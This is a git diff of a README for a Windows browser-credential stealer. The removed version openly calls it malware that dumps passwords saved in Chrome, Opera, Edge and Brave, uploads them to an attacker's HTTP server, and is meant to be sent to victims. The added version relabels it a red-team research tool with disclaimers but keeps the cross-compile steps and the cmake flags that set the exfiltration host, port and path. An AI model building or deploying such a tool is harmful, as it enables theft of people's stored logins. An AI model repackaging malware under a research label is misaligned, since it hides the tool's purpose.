@@ -1,79 +1,106 @@
-# About Project
+# Windows Browser Credential Access (Security Research)
 
-The purpose of the LCT-Malware ( Login Credentials Theif - Malicious Software ) is to dump target's login credentials that has been saved in the browsers' databases, and upload them in attacker's server.
+## Overview
 
+This project is a **red team / security research tool** demonstrating how locally
+stored browser credentials can be accessed and decrypted on **Windows systems**
+when executed with **authorized access**.
 
-It follows the decryption process in the victim's system ( as some decryption functions depend on the victim's system ).
-Then it checks the connection between attacker and the victim, to see if the server is available. if somehow the server didn't respond to the attacker, it will go to "Busy Sleep" until the server become available again.
+It models a **post-compromise credential access scenario** commonly evaluated
+during authorized penetration testing, red team engagements, and training labs.
 
-**Note:** *The Current Version of Malware ONLY Runs in Windows Systems*
+Authorized use only.
+Execute only on systems you own or have explicit permission to test.
 
-# Target Browsers of Malware
-  - Chrome
-  - Opera
-  - OperaGX
-  - Microsoft Edge
-  - Brave
+---
 
-# Dependencies
-<h3> Runtime Dependencies: </h3>
+## Scope
 
-  - Windows API ( Baked into every victim's system )
-  - LibSodium  ( Specified by the program )
-  - Sqlite3    ( Specified by the program )
+- Platform: Windows
+- Context: Local execution with user-level permissions
+- Focus: Browser credential storage and decryption
+- Out of scope:
+  - Privilege escalation
+  - Persistence
+  - Lateral movement
 
-**Note:** *So you dont need to play around with dependencies as they are always available*
+---
 
-<h3> Build Dependencies: </h3>
+## Technical Notes
 
-  - CMake
-  - Windows Compiler
+- Interfaces with browser credential databases
+- Uses platform-specific cryptographic services
+- Decryption routines execute in the local Windows environment
+- Some cryptographic operations depend on system-specific APIs
+- Network handling is modular and intended for controlled lab setups
 
-# Configuration
-Installing Build Dependencies in Debian Based OS:
-```
-sudo apt install binutils-mingw-w64-x86-64 gcc-mingw-w64-x86-64-win32 gcc-mingw-w64-base mingw-w64-common mingw-w64-x86-64-dev
-```
+---
 
-Installing Build Dependencies in Arch Based OS:
-```
-sudo pacman -S mingw-w64-binutils mingw-w64-crt mingw-w64-gcc mingw-w64-headers mingw-w64-winpthreads
-```
+## Dependencies
 
-<h3> Project Configuration Flags: </h3>
+### Runtime Dependencies
 
-  * -DHOSTNAME
-  * -DPORT
-  * -DPATH
+- Windows API
+- LibSodium
+- SQLite3
 
-HOSTNAME can be either IP or Hostname, this specifies the address that malware is going to send the dumped login credentials. <br>
-PORT specifies HTTP port on the reciever's system. ( by Default 80 ) <br>
-PATH specifies the Path of them reciever's HTTP Server. ( by default "/" )
+### Build Dependencies
 
-for example this configuration:
-```
-cmake -Bbuild -DHOSTNAME="192.168.1.1" -DPORT=5656 -DPATH=/app
-```
+- CMake
+- Windows-compatible compiler toolchain
 
-will upload credentials to this location: `http://192.168.1.1:5656/app`
+---
 
-**Note:** *`-B` flag specifies build directory*
+## Cross-Compilation Setup (Linux → Windows)
 
-# Usage
+### Debian-based systems
 
-1.install build dependencies with the instructions above. <br>
-2.then configure project with your system ( or maybe your server ) <br>
-3.build the project using following command:
-```
-cmake --build {BuildDir}
-```
+    sudo apt install binutils-mingw-w64-x86-64 \
+                     gcc-mingw-w64-x86-64-win32 \
+                     gcc-mingw-w64-base \
+                     mingw-w64-common \
+                     mingw-w64-x86-64-dev
 
-**Note:** *replace the {BuildDir} with your Build Directory*
+### Arch-based systems
 
-4.Start your listener in your system ( or maybe your server ) <br>
-**Note:** *The Listener should look for 'document' part of the POST form to recieve file* <br>
-5.then send the malware to your target. <br>
-6.Wait for execution and receive delicious information :)
+    sudo pacman -S mingw-w64-binutils \
+                 mingw-w64-crt \
+                 mingw-w64-gcc \
+                 mingw-w64-headers \
+                 mingw-w64-winpthreads
 
-# Contributors
-  - iHapiW
+---
+
+## Build Configuration
+
+The project is configured using CMake with compile-time parameters.
+
+### Configuration Flags
+
+- -DHOSTNAME : Target host (IP or hostname)
+- -DPORT     : HTTP port (default: 80)
+- -DPATH     : HTTP endpoint path (default: /)
+
+### Example Configuration
+
+    cmake -B build \
+      -DHOSTNAME="192.168.1.1" \
+      -DPORT=5656 \
+      -DPATH="/app"
+
+### Build
+
+    cmake --build build
+
+---
+
+## Legal & Ethical Notice
+
+This project is intended solely for **security research and authorized testing**.
+Unauthorized use may violate applicable laws and organizational policies.
+
+---
+
+## Status
+
+Maintained as a security research and red team training reference.
